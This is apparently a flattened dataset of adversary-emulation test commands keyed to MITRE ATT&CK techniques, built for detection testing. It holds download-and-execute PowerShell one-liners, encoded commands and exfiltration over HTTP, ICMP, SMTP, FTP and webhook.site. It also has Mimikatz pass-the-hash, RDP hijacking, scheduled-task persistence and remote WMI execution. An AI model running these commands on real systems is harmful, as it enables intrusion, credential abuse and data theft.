6874: [- name: ATHPowerShellCommandLineParameter -Command parameter variations] [attack_technique: T1059.001] [      if (-not $RequiredModule.ExportedCommands['Out-ATHPowerShellCommandLineParameter']) {exit 1} else {exit 0}]
6875: [- name: ATHPowerShellCommandLineParameter -Command parameter variations] [attack_technique: T1059.001] [    get_prereq_command: |]
6876: [- name: ATHPowerShellCommandLineParameter -Command parameter variations] [attack_technique: T1059.001] [      Install-Module -Name AtomicTestHarnesses -Scope CurrentUser -Force]
6877: [- name: ATHPowerShellCommandLineParameter -Command parameter variations] [attack_technique: T1059.001] [  executor:]
6878: [- name: ATHPowerShellCommandLineParameter -Command parameter variations] [attack_technique: T1059.001] [    command: 'Out-ATHPowerShellCommandLineParameter -CommandLineSwitchType #{command_line_switch_type} -CommandParamVariation #{command_param_variation} -Execute -ErrorAction Stop']
6881: [- name: PowerShell Command Execution] [attack_technique: T1059.001] [    command: |]
6882: [- name: PowerShell Command Execution] [attack_technique: T1059.001] [      powershell.exe -e  #{obfuscated_code}]
6885: [- name: PowerUp Invoke-AllChecks] [attack_technique: T1059.001] [    command: |]
6886: [- name: PowerUp Invoke-AllChecks] [attack_technique: T1059.001] [      $malcmdlets = #{Malicious_cmdlets}]
6887: [- name: PowerUp Invoke-AllChecks] [attack_technique: T1059.001] [      foreach ($cmdlets in $malcmdlets) {]
6888: [- name: PowerUp Invoke-AllChecks] [attack_technique: T1059.001] [          "function $cmdlets { Write-Host Pretending to invoke $cmdlets }"}]
6889: [- name: PowerUp Invoke-AllChecks] [attack_technique: T1059.001] [      foreach ($cmdlets in $malcmdlets) {]
6890: [- name: PowerUp Invoke-AllChecks] [attack_technique: T1059.001] [          $cmdlets}]
6891: [- name: PowerUp Invoke-AllChecks] [attack_technique: T1059.001] []
6892: [- name: PowerUp Invoke-AllChecks] [attack_technique: T1059.001] [  auto_generated_guid: 1289f78d-22d2-4590-ac76-166737e1811b]
6893: [- name: PowerUp Invoke-AllChecks] [attack_technique: T1059.001] [    Check for privilege escalation paths using PowerUp from PowerShellMafia]
6894: [- name: PowerUp Invoke-AllChecks] [attack_technique: T1059.001] [  supported_platforms:]
6895: [- name: PowerUp Invoke-AllChecks] [attack_technique: T1059.001] [  - windows]
6896: [- name: PowerUp Invoke-AllChecks] [attack_technique: T1059.001] [  executor:]
6897: [- name: PowerUp Invoke-AllChecks] [attack_technique: T1059.001] [    command: |]
6898: [- name: PowerUp Invoke-AllChecks] [attack_technique: T1059.001] [      [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12]
6899: [- name: PowerUp Invoke-AllChecks] [attack_technique: T1059.001] [      iex(iwr https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/d943001a7defb5e0d1657085a77a0e78609be58f/Privesc/PowerUp.ps1 -UseBasicParsing)]
6900: [- name: PowerUp Invoke-AllChecks] [attack_technique: T1059.001] [      Invoke-AllChecks]
6903: [- name: Scheduled Task Startup Script] [attack_technique: T1053.005] [    command: |]
6904: [- name: Scheduled Task Startup Script] [attack_technique: T1053.005] [      schtasks /create /tn "T1053_005_OnLogon" /sc onlogon /tr "cmd.exe /c calc.exe"]
6905: [- name: Scheduled Task Startup Script] [attack_technique: T1053.005] [      schtasks /create /tn "T1053_005_OnStartup" /sc onstart /ru system /tr "cmd.exe /c calc.exe"]
6911: [- name: Scheduled task Remote] [attack_technique: T1053.005] [    command: |]
6912: [- name: Scheduled task Remote] [attack_technique: T1053.005] [      SCHTASKS /Create /SC ONCE /TN spawn /TR #{task_command} /ST #{time}]
6940: [- name: Powershell Cmdlet Scheduled Task] [attack_technique: T1053.005] [    command: |]
6941: [- name: Powershell Cmdlet Scheduled Task] [attack_technique: T1053.005] [      SCHTASKS /Create /S #{target} /RU #{user_name} /RP #{password} /TN "Atomic task" /TR "#{task_command}" /SC daily /ST #{time}]
6949: [- name: Task Scheduler via VBA] [attack_technique: T1053.005] [    command: |]
6950: [- name: Task Scheduler via VBA] [attack_technique: T1053.005] [      $Action = New-ScheduledTaskAction -Execute "calc.exe"]
6951: [- name: Task Scheduler via VBA] [attack_technique: T1053.005] [      $Trigger = New-ScheduledTaskTrigger -AtLogon]
6952: [- name: Task Scheduler via VBA] [attack_technique: T1053.005] [      $User = New-ScheduledTaskPrincipal -GroupId "BUILTIN\Administrators" -RunLevel Highest]
6953: [- name: Task Scheduler via VBA] [attack_technique: T1053.005] [      $Set = New-ScheduledTaskSettingsSet]
6954: [- name: Task Scheduler via VBA] [attack_technique: T1053.005] [      $object = New-ScheduledTask -Action $Action -Principal $User -Trigger $Trigger -Settings $Set]
6955: [- name: Task Scheduler via VBA] [attack_technique: T1053.005] [      Register-ScheduledTask AtomicTask -InputObject $object]
6978: [- name: Task Scheduler via VBA] [attack_technique: T1053.005] [    command: |]
6979: [- name: Task Scheduler via VBA] [attack_technique: T1053.005] [      [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12]
6980: [- name: Task Scheduler via VBA] [attack_technique: T1053.005] [      IEX (iwr "https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1204.002/src/Invoke-MalDoc.ps1" -UseBasicParsing) ]
6981: [- name: Task Scheduler via VBA] [attack_technique: T1053.005] [      Invoke-MalDoc -macroFile "PathToAtomicsFolder\T1053.005\src\T1053.005-macrocode.txt" -officeProduct "#{ms_product}" -sub "Scheduler"]
6984: [- name: Scheduled Task Executing Base64 Encoded Commands From Registry] [attack_technique: T1053.005] [    command: |]
6985: [- name: Scheduled Task Executing Base64 Encoded Commands From Registry] [attack_technique: T1053.005] [      $xml = [System.IO.File]::ReadAllText("PathToAtomicsFolder\T1053.005\src\T1053_005_WMI.xml")]
6986: [- name: Scheduled Task Executing Base64 Encoded Commands From Registry] [attack_technique: T1053.005] [      Invoke-CimMethod -ClassName PS_ScheduledTask -NameSpace "Root\Microsoft\Windows\TaskScheduler" -MethodName "RegisterByXml" -Arguments @{ Force = $true; Xml =$xml; }]
7002: [- name: Scheduled Task Executing Base64 Encoded Commands From Registry] [attack_technique: T1053.005] [    command: |]
7003: [- name: Scheduled Task Executing Base64 Encoded Commands From Registry] [attack_technique: T1053.005] [      reg add HKCU\SOFTWARE\ATOMIC-T1053.005 /v test /t REG_SZ /d cGluZyAxMjcuMC4wLjE= /f]
7004: [- name: Scheduled Task Executing Base64 Encoded Commands From Registry] [attack_technique: T1053.005] [      schtasks.exe /Create /F /TN "ATOMIC-T1053.005" /TR "cmd /c start /min \"\" powershell.exe -Command IEX([System.Text.Encoding]::ASCII.GetString([System.Convert]::FromBase64String((Get-ItemProperty -Path HKCU:\\SOFTWARE\\ATOMIC-T1053.005).test)))" /sc daily /st #{time}]
7010: [- name: Execute a Command as a Service] [attack_technique: T1569.002] [    command: |]
7011: [- name: Execute a Command as a Service] [attack_technique: T1569.002] [      sc.exe create #{service_name} binPath= "#{executable_command}"]
7012: [- name: Execute a Command as a Service] [attack_technique: T1569.002] [      sc.exe start #{service_name}]
7013: [- name: Execute a Command as a Service] [attack_technique: T1569.002] [      sc.exe delete #{service_name}]
7018: [- name: Use PsExec to execute a command on a remote host] [attack_technique: T1569.002] [    command: |]
7019: [- name: Use PsExec to execute a command on a remote host] [attack_technique: T1569.002] [      #{psexec_exe} \\#{remote_host} -u #{user_name} -p #{password} -accepteula "C:\Windows\System32\calc.exe"]
7022: [- name: Encoded VBS code execution] [attack_technique: T1059.005] [    command: |]
7023: [- name: Encoded VBS code execution] [attack_technique: T1059.005] [      [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12]
7024: [- name: Encoded VBS code execution] [attack_technique: T1059.005] [      IEX (iwr "https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1204.002/src/Invoke-MalDoc.ps1" -UseBasicParsing)]
7025: [- name: Encoded VBS code execution] [attack_technique: T1059.005] [      Invoke-Maldoc -macroFile "PathToAtomicsFolder\T1059.005\src\T1059.005-macrocode.txt" -officeProduct "Word" -sub "Exec"]
7030: [- name: Extract Memory via VBA] [attack_technique: T1059.005] [    command: |]
7031: [- name: Extract Memory via VBA] [attack_technique: T1059.005] [      [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12]
7032: [- name: Extract Memory via VBA] [attack_technique: T1059.005] [      IEX (iwr "https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1204.002/src/Invoke-MalDoc.ps1" -UseBasicParsing) ]
7033: [- name: Extract Memory via VBA] [attack_technique: T1059.005] [      Invoke-Maldoc -macroFile "PathToAtomicsFolder\T1059.005\src\T1059_005-macrocode.txt" -officeProduct "Word" -sub "Extract"]
7038: [- name: Create and Execute Batch Script] [attack_technique: T1059.003] [    command: |]
7039: [- name: Create and Execute Batch Script] [attack_technique: T1059.003] [      Start-Process #{script_path}]
7044: [- name: Writes text to a file and displays it.] [attack_technique: T1059.003] [    command: |]
7045: [- name: Writes text to a file and displays it.] [attack_technique: T1059.003] [      echo "#{message}" > "#{file_contents_path}" & type "#{file_contents_path}"]
7050: [- name: Suspicious Execution via Windows Command Shell] [attack_technique: T1059.003] [    command: |]
7051: [- name: Suspicious Execution via Windows Command Shell] [attack_technique: T1059.003] [      %LOCALAPPDATA:~-3,1%md /c echo #{input_message} > #{output_file} & type #{output_file}]
7054: [- name: Simulate BlackByte Ransomware Print Bombing] [attack_technique: T1059.003] [    command: |]
7055: [- name: Simulate BlackByte Ransomware Print Bombing] [attack_technique: T1059.003] [      cmd /c "for /l %x in (1,1,#{max_to_print}) do start wordpad.exe /p #{file_to_print}" | out-null]
7060: [- name: WMI Reconnaissance Users] [attack_technique: T1047] [    command: |]
7061: [- name: WMI Reconnaissance Users] [attack_technique: T1047] [      wmic useraccount get /ALL /format:csv]
7064: [- name: WMI Reconnaissance Processes] [attack_technique: T1047] [    command: |]
7065: [- name: WMI Reconnaissance Processes] [attack_technique: T1047] [      wmic process get caption,executablepath,commandline /format:csv]
7068: [- name: WMI Reconnaissance Software] [attack_technique: T1047] [    command: |]
7069: [- name: WMI Reconnaissance Software] [attack_technique: T1047] [      wmic qfe get description,installedOn /format:csv]
7072: [- name: WMI Reconnaissance List Remote Services] [attack_technique: T1047] [    command: |]
7073: [- name: WMI Reconnaissance List Remote Services] [attack_technique: T1047] [      wmic /node:"#{node}" service where (caption like "%#{service_search_string}%")]
7076: [- name: WMI Execute Local Process] [attack_technique: T1047] [    command: |]
7077: [- name: WMI Execute Local Process] [attack_technique: T1047] [      wmic process call create #{process_to_execute}]
7082: [- name: WMI Execute Remote Process] [attack_technique: T1047] [    command: |]
7083: [- name: WMI Execute Remote Process] [attack_technique: T1047] [      wmic /user:#{user_name} /password:#{password} /node:"#{node}" process call create #{process_to_execute}]
7088: [- name: Create a Process using WMI Query and an Encoded Command] [attack_technique: T1047] [    command: |]
7089: [- name: Create a Process using WMI Query and an Encoded Command] [attack_technique: T1047] [      powershell -exec bypass -e SQBuAHYAbwBrAGUALQBXAG0AaQBNAGUAdABoAG8AZAAgAC0AUABhAHQAaAAgAHcAaQBuADMAMgBfAHAAcgBvAGMAZQBzAHMAIAAtAE4AYQBtAGUAIABjAHIAZQBhAHQAZQAgAC0AQQByAGcAdQBtAGUAbgB0AEwAaQBzAHQAIABuAG8AdABlAHAAYQBkAC4AZQB4AGUA]
7092: [- name: WMI Execute rundll32] [attack_technique: T1047] [    command: |]
7093: [- name: WMI Execute rundll32] [attack_technique: T1047] [      $Class = New-Object Management.ManagementClass(New-Object Management.ManagementPath("Win32_Process"))]
7094: [- name: WMI Execute rundll32] [attack_technique: T1047] [      $NewClass = $Class.Derive("#{new_class}")]
7095: [- name: WMI Execute rundll32] [attack_technique: T1047] [      $NewClass.Put()]
7096: [- name: WMI Execute rundll32] [attack_technique: T1047] [      Invoke-WmiMethod -Path #{new_class} -Name create -ArgumentList #{process_to_execute}]
7121: [- name: WMI Execute rundll32] [attack_technique: T1047] [    command: |]
7122: [- name: WMI Execute rundll32] [attack_technique: T1047] [      wmic /node:#{node} process call create "rundll32.exe #{dll_to_execute} #{function_to_execute}"]
7138: [- name: DNSExfiltration (doh)] [attack_technique: T1048] [    command: |]
7139: [- name: DNSExfiltration (doh)] [attack_technique: T1048] [      Import-Module #{ps_module}]
7140: [- name: DNSExfiltration (doh)] [attack_technique: T1048] [      Invoke-DNSExfiltrator -i #{ps_module} -d #{domain} -p #{password} -doh #{doh} -t #{time} #{encoding}]
7143: [- name: C2 Data Exfiltration] [attack_technique: T1041] [    command: |]
7144: [- name: C2 Data Exfiltration] [attack_technique: T1041] [     if(-not (Test-Path #{filepath})){ ]
7145: [- name: C2 Data Exfiltration] [attack_technique: T1041] [       1..100 | ForEach-Object { Add-Content -Path #{filepath} -Value "This is line $_." }]
7146: [- name: C2 Data Exfiltration] [attack_technique: T1041] [     }]
7147: [- name: C2 Data Exfiltration] [attack_technique: T1041] [     [System.Net.ServicePointManager]::Expect100Continue = $false]
7148: [- name: C2 Data Exfiltration] [attack_technique: T1041] [     $filecontent = Get-Content -Path #{filepath}]
7149: [- name: C2 Data Exfiltration] [attack_technique: T1041] [     Invoke-WebRequest -Uri #{destination_url} -Method POST -Body $filecontent -DisableKeepAlive]
7152: [- name: Exfiltration Over Alternative Protocol - ICMP] [attack_technique: T1048.003] [    command: |]
7153: [- name: Exfiltration Over Alternative Protocol - ICMP] [attack_technique: T1048.003] [      $ping = New-Object System.Net.Networkinformation.ping; foreach($Data in Get-Content -Path #{input_file} -Encoding Byte -ReadCount 1024) { $ping.Send("#{ip_address}", 1500, $Data) }]
7156: [- name: Exfiltration Over Alternative Protocol - HTTP] [attack_technique: T1048.003] [    command: |]
7157: [- name: Exfiltration Over Alternative Protocol - HTTP] [attack_technique: T1048.003] [     $content = Get-Content #{input_file}]
7158: [- name: Exfiltration Over Alternative Protocol - HTTP] [attack_technique: T1048.003] [     Invoke-WebRequest -Uri #{ip_address} -Method POST -Body $content]
7161: [- name: Exfiltration Over Alternative Protocol - SMTP] [attack_technique: T1048.003] [    command: |]
7162: [- name: Exfiltration Over Alternative Protocol - SMTP] [attack_technique: T1048.003] [     Send-MailMessage -From #{sender} -To #{receiver} -Subject "T1048.003 Atomic Test" -Attachments #{input_file} -SmtpServer #{smtp_server}]
7165: [- name: MAZE FTP Upload] [attack_technique: T1048.003] [    command: |]
7166: [- name: MAZE FTP Upload] [attack_technique: T1048.003] [      $Dir_to_copy = "$env:windir\temp"]
7167: [- name: MAZE FTP Upload] [attack_technique: T1048.003] [      $ftp = "ftp://#{ftp_server}/"]
7168: [- name: MAZE FTP Upload] [attack_technique: T1048.003] [      $web_client = New-Object System.Net.WebClient]
7169: [- name: MAZE FTP Upload] [attack_technique: T1048.003] [      $web_client.Credentials = New-Object System.Net.NetworkCredential('#{username}', '#{password}')]
7170: [- name: MAZE FTP Upload] [attack_technique: T1048.003] [      if (test-connection -count 1 -computername "#{ftp_server}" -quiet)]
7171: [- name: MAZE FTP Upload] [attack_technique: T1048.003] [      {foreach($file in (dir $Dir_to_copy "*.7z"))]
7172: [- name: MAZE FTP Upload] [attack_technique: T1048.003] [      {echo "Uploading $file..."]
7173: [- name: MAZE FTP Upload] [attack_technique: T1048.003] [      $uri = New-Object System.Uri($ftp+$file.name)]
7174: [- name: MAZE FTP Upload] [attack_technique: T1048.003] [      $web_client.UploadFile($uri, $file.FullName)}}]
7175: [- name: MAZE FTP Upload] [attack_technique: T1048.003] [      else]
7176: [- name: MAZE FTP Upload] [attack_technique: T1048.003] [      {echo "FTP Server Unreachable. Please verify the server address in input args and try again."}]
7187: [- name: Data Exfiltration with ConfigSecurityPolicy] [attack_technique: T1567] [    command: |]
7188: [- name: Data Exfiltration with ConfigSecurityPolicy] [attack_technique: T1567] [      $path = resolve-path "c:\ProgramData\Microsoft\Windows Defender\Platform\*\ConfigSecurityPolicy.exe"]
7189: [- name: Data Exfiltration with ConfigSecurityPolicy] [attack_technique: T1567] [      & $path[0] c:\temp\config.xml "https://webhook.site?d=sensitive-data-here"]
7192: [- name: PowerShell Lateral Movement using MMC20] [attack_technique: T1021.003] [    command: |]
7193: [- name: PowerShell Lateral Movement using MMC20] [attack_technique: T1021.003] [      [activator]::CreateInstance([type]::GetTypeFromProgID("MMC20.application","#{computer_name}")).Document.ActiveView.ExecuteShellCommand("c:\windows\system32\calc.exe", $null, $null, "7")]
7196: [- name: Mimikatz Pass the Hash] [attack_technique: T1550.002] [    command: |]
7197: [- name: Mimikatz Pass the Hash] [attack_technique: T1550.002] [      #{mimikatz_path} "sekurlsa::pth /user:#{user_name} /domain:#{domain} /ntlm:#{ntlm}"]
7200: [- name: crackmapexec Pass the Hash] [attack_technique: T1550.002] [    command: |]
7201: [- name: crackmapexec Pass the Hash] [attack_technique: T1550.002] [      #{crackmapexec_exe} #{domain} -u #{user_name} -H #{ntlm} -x #{command}]
7209: [- name: Mimikatz Kerberos Ticket Attack] [attack_technique: T1550.003] [    command: |]
7210: [- name: Mimikatz Kerberos Ticket Attack] [attack_technique: T1550.003] [      #{mimikatz_exe} "kerberos::ptt #{ticket}"]
7213: [- name: RDP hijacking] [attack_technique: T1563.002] [    command: |]
7214: [- name: RDP hijacking] [attack_technique: T1563.002] [      query user]
7215: [- name: RDP hijacking] [attack_technique: T1563.002] [      sc.exe create sesshijack binpath= "cmd.exe /k tscon #{Session_ID} /dest:#{Destination_ID}"]
7216: [- name: RDP hijacking] [attack_technique: T1563.002] [      net start sesshijack]
7221: [- name: RDP to DomainController] [attack_technique: T1021.001] [    command: |]
7222: [- name: RDP to DomainController] [attack_technique: T1021.001] [      $Server=#{logonserver}]
7223: [- name: RDP to DomainController] [attack_technique: T1021.001] [      $User = Join-Path #{domain} #{username}]
7224: [- name: RDP to DomainController] [attack_technique: T1021.001] [      $Password="#{password}"]
7225: [- name: RDP to DomainController] [attack_technique: T1021.001] [      cmdkey /generic:TERMSRV/$Server /user:$User /pass:$Password]
7226: [- name: RDP to DomainController] [attack_technique: T1021.001] [      mstsc /v:$Server]
7227: [- name: RDP to DomainController] [attack_technique: T1021.001] [      echo "RDP connection established"]
7233: [- name: RDP to Server] [attack_technique: T1021.001] [    command: |]
7234: [- name: RDP to Server] [attack_technique: T1021.001] [      $Server="#{logonserver}"]
7235: [- name: RDP to Server] [attack_technique: T1021.001] [      $User="#{username}"]
7236: [- name: RDP to Server] [attack_technique: T1021.001] [      $Password="#{password}"]
7237: [- name: RDP to Server] [attack_technique: T1021.001] [      cmdkey /generic:TERMSRV/$Server /user:$User /pass:$Password]
7238: [- name: RDP to Server] [attack_technique: T1021.001] [      mstsc /v:$Server]
7239: [- name: RDP to Server] [attack_technique: T1021.001] [      echo "RDP connection established"]
7245: [- name: Changing RDP Port to Non Standard Port via Powershell] [attack_technique: T1021.001] [    command: |]
7246: [- name: Changing RDP Port to Non Standard Port via Powershell] [attack_technique: T1021.001] [      Set-ItemProperty -Path 'HKLM:\SYSTEM\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp' -name "PortNumber" -Value #{NEW_Remote_Port}]
7247: [- name: Changing RDP Port to Non Standard Port via Powershell] [attack_technique: T1021.001] [      New-NetFirewallRule -DisplayName 'RDPPORTLatest-TCP-In' -Profile 'Public' -Direction Inbound -Action Allow -Protocol TCP -LocalPort #{NEW_Remote_Port}]
7253: [- name: Changing RDP Port to Non Standard Port via Command_Prompt] [attack_technique: T1021.001] [    command: |]
7254: [- name: Changing RDP Port to Non Standard Port via Command_Prompt] [attack_technique: T1021.001] [      reg add "HKLM\System\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp" /v PortNumber /t REG_DWORD /d #{NEW_Remote_Port} -f]
7255: [- name: Changing RDP Port to Non Standard Port via Command_Prompt] [attack_technique: T1021.001] [      netsh advfirewall firewall add rule name="RDPPORTLatest-TCP-In" dir=in action=allow protocol=TCP localport=#{NEW_Remote_Port}]
7261: [- name: Map admin share] [attack_technique: T1021.002] [    command: |]
7262: [- name: Map admin share] [attack_technique: T1021.002] [      cmd.exe /c "net use \\#{computer_name}\#{share_name} #{password} /u:#{user_name}"]
7265: [- name: Map Admin Share PowerShell] [attack_technique: T1021.002] [    command: |]
7266: [- name: Map Admin Share PowerShell] [attack_technique: T1021.002] [      New-PSDrive -name #{map_name} -psprovider filesystem -root \\#{computer_name}\#{share_name}]
7269: [- name: Copy and Execute File with PsExec] [attack_technique: T1021.002] [    command: |]
7270: [- name: Copy and Execute File with PsExec] [attack_technique: T1021.002] [      #{psexec_exe} #{remote_host} -accepteula -c #{command_path}]
7273: [- name: Execute command writing output to local Admin Share] [attack_technique: T1021.002] [    command: |]
7274: [- name: Execute command writing output to local Admin Share] [attack_technique: T1021.002] [      cmd.exe /Q /c #{command_to_execute} 1> \\127.0.0.1\ADMIN$\#{output_file} 2>&1]
7277: [- name: Enable Windows Remote Management] [attack_technique: T1021.006] [    command: |]
7278: [- name: Enable Windows Remote Management] [attack_technique: T1021.006] [      Enable-PSRemoting -Force]
7281: [- name: Invoke-Command] [attack_technique: T1021.006] [    command: |]
7282: [- name: Invoke-Command] [attack_technique: T1021.006] [      invoke-command -ComputerName #{host_name} -scriptblock {#{remote_command}}]
7301: [- name: Activate Guest Account] [attack_technique: T1078.001] [    command: |]
7302: [- name: Activate Guest Account] [attack_technique: T1078.001] [     net user #{guest_user} /active:yes]
7328: [- name: Download Macro-Enabled Phishing Attachment] [attack_technique: T1566.001] [    command: |]
7329: [- name: Download Macro-Enabled Phishing Attachment] [attack_technique: T1566.001] [      $url = 'https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1566.001/bin/PhishingAttachment.xlsm']
7330: [- name: Download Macro-Enabled Phishing Attachment] [attack_technique: T1566.001] [      [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12]
7331: [- name: Download Macro-Enabled Phishing Attachment] [attack_technique: T1566.001] [      Invoke-WebRequest -Uri $url -OutFile $env:TEMP\PhishingAttachment.xlsm]
7334: [- name: Word spawned a command shell and used an IP address in the command line] [attack_technique: T1566.001] [    command: |]
7335: [- name: Word spawned a command shell and used an IP address in the command line] [attack_technique: T1566.001] [      [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12]
7336: [- name: Word spawned a command shell and used an IP address in the command line] [attack_technique: T1566.001] [      IEX (iwr "https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1204.002/src/Invoke-MalDoc.ps1" -UseBasicParsing)]
7337: [- name: Word spawned a command shell and used an IP address in the command line] [attack_technique: T1566.001] [      $macrocode = "   Open `"#{jse_path}`" For Output As #1`n   Write #1, `"WScript.Quit`"`n   Close #1`n   Shell`$ `"ping 8.8.8.8`"`n"]
7338: [- name: Word spawned a command shell and used an IP address in the command line] [attack_technique: T1566.001] [      Invoke-MalDoc -macroCode $macrocode -officeProduct "#{ms_product}"]
7343: [- name: Octopus Scanner Malware Open Source Supply Chain] [attack_technique: T1195] [    command: |]
7344: [- name: Octopus Scanner Malware Open Source Supply Chain] [attack_technique: T1195] [      copy %temp%\ExplorerSync.db %temp%\..\Microsoft\ExplorerSync.db]
7345: [- name: Octopus Scanner Malware Open Source Supply Chain] [attack_technique: T1195] [      schtasks /create /tn ExplorerSync /tr "javaw -jar %temp%\..\Microsoft\ExplorerSync.db" /sc MINUTE /f]
